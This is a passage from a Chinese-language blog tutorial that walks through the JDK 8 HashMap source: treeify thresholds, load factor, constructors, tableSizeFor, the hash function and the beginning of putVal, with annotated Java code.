</p><p>也就是说：选择8因为符合泊松分布，超过8的时候，概率已经非常小了，所以我们选择8这个数字。</p><p>补充：</p><p>1）.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> Poisson分布(泊松分布)，是一种统计与概率学里常见到的离散[概率分布]。</span><br><span class="line">泊松分布的概率函数为：</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615094418.png" alt="image-20191115161055901"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">泊松分布的参数λ是单位时间(或单位面积)内随机事件的平均发生次数。 泊松分布适合于描述单位时间内随机事件发生的次数。</span><br></pre></td></tr></table></figure><p>2）.以下是我在研究这个问题时，在一些资料上面翻看的解释：供大家参考：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">红黑树的平均查找长度是log(n)，如果长度为<span class="number">8</span>，平均查找长度为log(<span class="number">8</span>)=<span class="number">3</span>，链表的平均查找长度为n/<span class="number">2</span>，当长度为<span class="number">8</span>时，平均查找长度为<span class="number">8</span>/<span class="number">2</span>=<span class="number">4</span>，这才有转换成树的必要；链表长度如果是小于等于<span class="number">6</span>，<span class="number">6</span>/<span class="number">2</span>=<span class="number">3</span>，而log(<span class="number">6</span>)=<span class="number">2.6</span>，虽然速度也很快的，但是转化为树结构和生成树的时间并不会太短。</span><br></pre></td></tr></table></figure><p><strong>6.当链表的值小于6则会从红黑树转回链表</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//当桶(bucket)上的结点数小于这个值时树转链表</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> UNTREEIFY_THRESHOLD = <span class="number">6</span>;</span><br></pre></td></tr></table></figure><p>7.当Map里面的数量超过这个值时，表中的桶才能进行树形化 ，否则桶内元素太多时会扩容，而不是树形化。为了避免进行扩容、树形化选择的冲突，这个值不能小于 4 * TREEIFY_THRESHOLD (8)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//桶中结构转化为红黑树对应的数组长度最小的值 </span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MIN_TREEIFY_CAPACITY = <span class="number">64</span>;</span><br></pre></td></tr></table></figure><p><strong>8、table用来初始化(必须是二的n次幂)(重点)</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//存储元素的数组 </span></span><br><span class="line"><span class="keyword">transient</span> Node&lt;K,V&gt;[] table;</span><br></pre></td></tr></table></figure><p><strong>table</strong>在JDK1.8中我们了解到HashMap是由数组加链表加红黑树来组成的结构其中table就是HashMap中的数组，jdk8之前数组类型是Entry&lt;K,V&gt;类型。从jdk1.8之后是Node&lt;K,V&gt;类型。只是换了个名字，都实现了一样的接口：Map.Entry&lt;K,V&gt;。负责存储键值对数据的。</p><p>9、用来存放缓存 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//存放具体元素的集合</span></span><br><span class="line"><span class="keyword">transient</span> Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet;</span><br></pre></td></tr></table></figure><p><strong>10、 HashMap中存放元素的个数(重点)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//存放元素的个数，注意这个不等于数组的长度。</span></span><br><span class="line"> <span class="keyword">transient</span> <span class="keyword">int</span> size;</span><br></pre></td></tr></table></figure><p><strong>size</strong>为HashMap中K-V的实时数量，不是数组table的长度。</p><p>11、 用来记录HashMap的修改次数 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 每次扩容和更改map结构的计数器</span></span><br><span class="line"> <span class="keyword">transient</span> <span class="keyword">int</span> modCount;</span><br></pre></td></tr></table></figure><p>12、 用来调整大小下一个容量的值计算方式为(容量*负载因子) </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 临界值 当实际大小(容量*负载因子)超过临界值时，会进行扩容</span></span><br><span class="line"><span class="keyword">int</span> threshold;</span><br></pre></td></tr></table></figure><p><strong>13、 哈希表的加载因子(重点)</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载因子</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">float</span> loadFactor;</span><br></pre></td></tr></table></figure><p><strong>说明：</strong></p><p>1.<strong>loadFactor</strong>加载因子，是用来衡量 HashMap 满的程度，<strong>表示HashMap的疏密程度，影响hash操作到同一个数组位置的概率</strong>，计算HashMap的实时加载因子的方法为：size/capacity，而不是占用桶的数量去除以capacity。capacity 是桶的数量，也就是 table 的长度length。</p><p><strong>loadFactor太大导致查找元素效率低，太小导致数组的利用率低，存放的数据会很分散。loadFactor的默认值为0.75f是官方给出的一个比较好的临界值</strong>。</p><p><strong>当HashMap里面容纳的元素已经达到HashMap数组长度的75%时，表示HashMap太挤了，需要扩容，而扩容这个过程涉及到 rehash、复制数据等操作，非常消耗性能。所以开发中尽量减少扩容的次数，可以通过创建HashMap集合对象时指定初始容量来尽量避免。</strong></p><p><strong>同时在HashMap的构造器中可以定制loadFactor。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">构造方法：</span><br><span class="line">HashMap(<span class="keyword">int</span> initialCapacity, <span class="keyword">float</span> loadFactor) 构造一个带指定初始容量和加载因子的空 HashMap。</span><br></pre></td></tr></table></figure><p>2.为什么加载因子设置为0.75,初始化临界值是12？</p><p>loadFactor越趋近于1，那么 数组中存放的数据(entry)也就越多，也就越密，也就是会让链表的长度增加，loadFactor越小，也就是趋近于0，数组中存放的数据(entry)也就越少，也就越稀疏。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615094413.png" alt="image-20191115173553375"></p><p>如果希望链表尽可能少些。要提前扩容，有的数组空间有可能一直没有存储数据。加载因子尽可能小一些。</p><p>举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如：加载因子是0.4。 那么16*0.4---&gt;6 如果数组中满6个空间就扩容会造成数组利用率太低了。</span><br><span class="line"> 加载因子是0.9。 那么16*0.9----&gt;14 那么这样就会导致链表有点多了。导致查找元素效率低。</span><br></pre></td></tr></table></figure><p>所以既兼顾数组利用率又考虑链表不要太多，经过大量测试0.75是最佳方案。</p><ul><li><strong>threshold</strong>计算公式：capacity(数组长度默认16) * loadFactor(负载因子默认0.75)。这个值是当前已占用数组长度的最大值。<strong>当Size&gt;=threshold</strong>的时候，那么就要考虑对数组的resize(扩容)，也就是说，这个的意思就是 <strong>衡量数组是否需要扩增的一个标准</strong>。 扩容后的 HashMap 容量是之前容量的两倍.</li></ul><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><p> HashMap 中重要的构造方法，它们分别如下： </p><p>1、构造一个空的 <code>HashMap</code> ，默认初始容量（16）和默认负载因子（0.75）。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR; <span class="comment">// 将默认的加载因子0.75赋值给loadFactor，并没有创建数组</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、 构造一个具有指定的初始容量和默认负载因子（0.75） <code>HashMap</code>。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 指定“容量大小”的构造函数</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">this</span>(initialCapacity, DEFAULT_LOAD_FACTOR);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>3、 构造一个具有指定的初始容量和负载因子的 <code>HashMap</code>。我们来分析一下。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 指定“容量大小”和“加载因子”的构造函数</span></span><br><span class="line"><span class="comment"> initialCapacity: 指定的容量</span></span><br><span class="line"><span class="comment"> loadFactor:指定的加载因子</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity, <span class="keyword">float</span> loadFactor)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//判断初始化容量initialCapacity是否小于0</span></span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">//如果小于0，则抛出非法的参数异常IllegalArgumentException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal initial capacity: "</span> +</span><br><span class="line">                                               initialCapacity);</span><br><span class="line">    <span class="comment">//判断初始化容量initialCapacity是否大于集合的最大容量MAXIMUM_CAPACITY-》2的30次幂</span></span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &gt; MAXIMUM_CAPACITY)</span><br><span class="line">            <span class="comment">//如果超过MAXIMUM_CAPACITY，会将MAXIMUM_CAPACITY赋值给initialCapacity</span></span><br><span class="line">            initialCapacity = MAXIMUM_CAPACITY;</span><br><span class="line">    <span class="comment">//判断负载因子loadFactor是否小于等于0或者是否是一个非数值</span></span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="comment">//如果满足上述其中之一，则抛出非法的参数异常IllegalArgumentException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal load factor: "</span> +</span><br><span class="line">                                               loadFactor);</span><br><span class="line">     <span class="comment">//将指定的加载因子赋值给HashMap成员变量的负载因子loadFactor</span></span><br><span class="line">        <span class="keyword">this</span>.loadFactor = loadFactor;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    tableSizeFor(initialCapacity) 判断指定的初始化容量是否是2的n次幂，如果不是那么会变为比指定初始化容量大的最小的2的n次幂。这点上述已经讲解过。</span></span><br><span class="line"><span class="comment">    但是注意，在tableSizeFor方法体内部将计算后的数据返回给调用这里了，并且直接赋值给threshold边界值了。有些人会觉得这里是一个bug,应该这样书写：</span></span><br><span class="line"><span class="comment">    this.threshold = tableSizeFor(initialCapacity) * this.loadFactor;</span></span><br><span class="line"><span class="comment">    这样才符合threshold的意思（当HashMap的size到达threshold这个阈值时会扩容）。</span></span><br><span class="line"><span class="comment">但是，请注意，在jdk8以后的构造方法中，并没有对table这个成员变量进行初始化，table的初始化被推 迟到了put方法中，在put方法中会对threshold重新计算，put方法的具体实现我们下面会进行讲解</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">        <span class="keyword">this</span>.threshold = tableSizeFor(initialCapacity);</span><br><span class="line">    &#125;</span><br><span class="line">最后调用了tableSizeFor，来看一下方法实现：</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns a power of two size for the given target capacity.</span></span><br><span class="line"><span class="comment">       返回比指定初始化容量大的最小的2的n次幂</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">tableSizeFor</span><span class="params">(<span class="keyword">int</span> cap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = cap - <span class="number">1</span>;</span><br><span class="line">        n |= n &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        n |= n &gt;&gt;&gt; <span class="number">2</span>;</span><br><span class="line">        n |= n &gt;&gt;&gt; <span class="number">4</span>;</span><br><span class="line">        n |= n &gt;&gt;&gt; <span class="number">8</span>;</span><br><span class="line">        n |= n &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">return</span> (n &lt; <span class="number">0</span>) ? <span class="number">1</span> : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>说明：</p><p>对于 this.threshold = tableSizeFor(initialCapacity); 疑问解答：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tableSizeFor(initialCapacity) 判断指定的初始化容量是否是<span class="number">2</span>的n次幂，如果不是那么会变为比指定初始化容量大的最小的<span class="number">2</span>的n次幂。这点上述已经讲解过。</span><br><span class="line">但是注意，在tableSizeFor方法体内部将计算后的数据返回给调用这里了，并且直接赋值给threshold边界值了。有些人会觉得这里是一个bug,应该这样书写：</span><br><span class="line"><span class="keyword">this</span>.threshold = tableSizeFor(initialCapacity) * <span class="keyword">this</span>.loadFactor;</span><br><span class="line">这样才符合threshold的意思（当HashMap的size到达threshold这个阈值时会扩容）。</span><br><span class="line">但是，请注意，在jdk8以后的构造方法中，并没有对table这个成员变量进行初始化，table的初始化被推迟到了put方法中，在put方法中会对threshold重新计算，put方法的具体实现我们下面会进行讲解</span><br></pre></td></tr></table></figure><p>4、包含另一个“Map”的构造函数 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造一个映射关系与指定 Map 相同的新 HashMap。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(Map&lt;? extends K, ? extends V&gt; m)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//负载因子loadFactor变为默认的负载因子0.75</span></span><br><span class="line">         <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR;</span><br><span class="line">         putMapEntries(m, <span class="keyword">false</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>最后调用了putMapEntries，来看一下方法实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">putMapEntries</span><span class="params">(Map&lt;? extends K, ? extends V&gt; m, <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//获取参数集合的长度</span></span><br><span class="line">    <span class="keyword">int</span> s = m.size();</span><br><span class="line">    <span class="keyword">if</span> (s &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//判断参数集合的长度是否大于0，说明大于0</span></span><br><span class="line">        <span class="keyword">if</span> (table == <span class="keyword">null</span>)  <span class="comment">// 判断table是否已经初始化</span></span><br><span class="line">        &#123; <span class="comment">// pre-size</span></span><br><span class="line">                <span class="comment">// 未初始化，s为m的实际元素个数</span></span><br><span class="line">                <span class="keyword">float</span> ft = ((<span class="keyword">float</span>)s / loadFactor) + <span class="number">1.0F</span>;</span><br><span class="line">                <span class="keyword">int</span> t = ((ft &lt; (<span class="keyword">float</span>)MAXIMUM_CAPACITY) ?</span><br><span class="line">                        (<span class="keyword">int</span>)ft : MAXIMUM_CAPACITY);</span><br><span class="line">                <span class="comment">// 计算得到的t大于阈值，则初始化阈值</span></span><br><span class="line">                <span class="keyword">if</span> (t &gt; threshold)</span><br><span class="line">                    threshold = tableSizeFor(t);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 已初始化，并且m元素个数大于阈值，进行扩容处理</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (s &gt; threshold)</span><br><span class="line">            resize();</span><br><span class="line">        <span class="comment">// 将m中的所有元素添加至HashMap中</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;? extends K, ? extends V&gt; e : m.entrySet()) &#123;</span><br><span class="line">            K key = e.getKey();</span><br><span class="line">            V value = e.getValue();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, evict);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：</p><p> float ft = ((float)s / loadFactor) + 1.0F;这一行代码中为什么要加1.0F ？</p><p> s/loadFactor的结果是小数，加1.0F与(int)ft相当于是对小数做一个向上取整以尽可能的保证更大容量，更大的容量能够减少resize的调用次数。所以 + 1.0F是为了获取更大的容量。 </p><p>例如：原来集合的元素个数是6个，那么6/0.75是8，是2的n次幂，那么新的数组大小就是8了。然后原来数组的数据就会存储到长度是8的新的数组中了，这样会导致在存储元素的时候，容量不够，还得继续扩容，那么性能降低了，而如果+1呢，数组长度直接变为16了，这样可以减少数组的扩容。</p><h3 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h3><h4 id="增加方法"><a href="#增加方法" class="headerlink" title="增加方法"></a>增加方法</h4><p>put方法是比较复杂的，实现步骤大致如下：</p><p>1）先通过hash值计算出key映射到哪个桶；</p><p>2）如果桶上没有碰撞冲突，则直接插入；</p><p>3）如果出现碰撞冲突了，则需要处理冲突：</p><p>​    a:如果该桶使用红黑树处理冲突，则调用红黑树的方法插入数据；</p><p>​    b:否则采用传统的链式方法插入。如果链的长度达到临界值，则把链转变为红黑树；</p><p>4）如果桶中存在重复的键，则为该键替换新值value；</p><p>5）如果size大于阈值threshold，则进行扩容；</p><p>具体的方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明： </p><p>​    1）HashMap只提供了put用于添加元素，putVal方法只是给put方法调用的一个方法，并没有提供给用户使用。 所以我们重点看putVal方法。</p><pre><code>2）我们可以看到在putVal()方法中key在这里执行了一下hash()方法,来看一下Hash方法是如何实现的。 </code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">int</span> h;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    1）如果key等于null：</span></span><br><span class="line"><span class="comment">    可以看到当key等于null的时候也是有哈希值的，返回的是0.</span></span><br><span class="line"><span class="comment">    2）如果key不等于null：</span></span><br><span class="line"><span class="comment">    首先计算出key的hashCode赋值给h,然后与h无符号右移16位后的二进制进行按位异或得到最后的hash值</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">       <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面可以得知HashMap是支持Key为空的，而HashTable是直接用Key来获取HashCode所以key为空会抛异常。</p><p>{其实上面就已经解释了为什么HashMap的长度<strong>为什么要是2的幂</strong>因为HashMap 使用的方法很巧妙，它通过 hash &amp; (table.length -1)来得到该对象的保存位，前面说过 HashMap 底层数组的长度总是2的n次方，这是HashMap在速度上的优化。当 length 总是2的n次方时，hash &amp; (length-1)运算等价于对 length 取模，也就是hash%length，但是&amp;比%具有更高的效率。比如 n % 32 = n &amp; (32 -1)。}</p><p><strong>解读上述hash方法：</strong></p><p>我们先研究下key的哈希值是如何计算出来的。key的哈希值是通过上述方法计算出来的。</p><p>这个哈希方法首先计算出key的hashCode赋值给h,然后与h无符号右移16位后的二进制进行按位异或得到最后的    hash值。计算过程如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">int</span> h;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    1）如果key等于null：</span></span><br><span class="line"><span class="comment">    可以看到当key等于null的时候也是有哈希值的，返回的是0.</span></span><br><span class="line"><span class="comment">    2）如果key不等于null：</span></span><br><span class="line"><span class="comment">    首先计算出key的hashCode赋值给h,然后与h无符号右移16位后的二进制进行按位异或得到最后的hash值</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">       <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在putVal函数中使用到了上述hash函数计算的哈希值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">        。。。。。。。。。。。。。。</span><br><span class="line">        <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)<span class="comment">//这里的n表示数组长度16</span></span><br><span class="line">       。。。。。。。。。。。。。。</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>计算过程如下所示：</p><p>​    说明：</p><p>​        1）key.hashCode()；返回散列值也就是hashcode。假设随便生成的一个值。</p><p>​        2）n表示数组初始化的长度是16</p><p>​        3）&amp;（按位与运算）：运算规则：相同的二进制数位上，都是1的时候，结果为1，否则为零。</p><p>​        4）^（按位异或运算）：运算规则：相同的二进制数位上，数字相同，结果为0，不同为1。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615094407.png" alt="image-20191114193730911"></p><p>简单来说就是：</p><ul><li><p>高16 bit 不变，低16 bit 和高16 bit 做了一个异或（得到的 hashcode 转化为32位二进制，前16位和后16位低16 bit和高16 bit做了一个异或）</p><p><strong>问题：为什么要这样操作呢？</strong></p><p>如果当n即数组长度很小，假设是16的话，那么n-1即为  —》1111 ，这样的值和hashCode()直接做按位与操作，实际上只使用了哈希值的后4位。如果当哈希值的高位变化很大，低位变化很小，这样就很容易造成哈希冲突了，所以这里把高低位都利用起来，从而解决了这个问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">例如上述：</span><br><span class="line">hashCode()值：     <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">0000</span> <span class="number">1110</span> <span class="number">1010</span></span><br><span class="line">&amp;</span><br><span class="line">n-<span class="number">1</span>即<span class="number">16</span>-<span class="number">1</span>--》<span class="number">15</span>：  。。。。。。。。。。。。。。。。。。。。。。<span class="number">1111</span></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">  <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">1010</span> ----》<span class="number">10</span>作为索引</span><br><span class="line">其实就是将hashCode值作为数组索引，那么如果下个高位hashCode不一致，低位一致的话，就会造成计算的索引还是<span class="number">10</span>,从而造成了哈希冲突了。降低性能。</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>(n-1) &amp; hash = -&gt; 得到下标   (n-1)   n表示数组长度16，n-1就是15</p></li><li><p>取余数本质是不断做除法，把剩余的数减去，运算效率要比位运算低。</p></li></ul><p>现在看putVal()方法，看看它到底做了什么。</p><p>主要参数：</p><ul><li>hash key的hash值</li><li>key 原始Key</li><li>value 要存放的值</li><li>onlyIfAbsent 如果true代表不更改现有的值</li><li>evict 如果为false表示table为创建状态</li></ul><p>putVal()方法源代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 